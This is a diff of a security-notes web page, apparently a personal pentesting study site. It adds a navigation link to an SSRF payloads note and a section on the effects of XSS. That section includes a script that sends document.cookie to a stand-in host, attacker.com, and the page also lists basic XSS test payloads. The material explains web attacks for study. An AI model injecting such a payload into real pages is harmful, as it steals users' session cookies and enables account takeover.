@@ -2078,6 +2078,27 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Notes/payloads%20for%20SSRF/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    payloads for SSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -2761,6 +2782,15 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#the-significant-effects-xxs-can-cause" class="md-nav__link">
+    <span class="md-ellipsis">
+      The significant effects XXS can cause
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#sample-xss-commands-to-check" class="md-nav__link">
     <span class="md-ellipsis">
       Sample XSS commands to check
@@ -2926,6 +2956,15 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#the-significant-effects-xxs-can-cause" class="md-nav__link">
+    <span class="md-ellipsis">
+      The significant effects XXS can cause
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#sample-xss-commands-to-check" class="md-nav__link">
     <span class="md-ellipsis">
       Sample XSS commands to check
@@ -3024,6 +3063,15 @@
 <p>All input areas</p>
 </li>
 </ol>
+<h2 id="the-significant-effects-xxs-can-cause">The significant effects XXS can cause</h2>
+<p><strong>Session Hijacking and Credential Theft</strong></p>
+<pre><code class="language-javascript">&lt;script&gt;
+fetch('http://attacker.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;
+</code></pre>
+<p>The attacker receives the session token and uses it to impersonate the victim by including the stolen cookie in their HTTP requests to the web application.</p>
+<p><strong>Unauthorized Access:</strong>
+The attacker gains access to the victim’s account, potentially viewing sensitive information, performing transactions, or changing account settings.</p>
 <h2 id="sample-xss-commands-to-check">Sample XSS commands to check</h2>
 <pre><code class="language-javascript">&lt;script&gt;alert(1)&lt;/script&gt;
 &lt;img src=x onerror=alert(1) &gt;
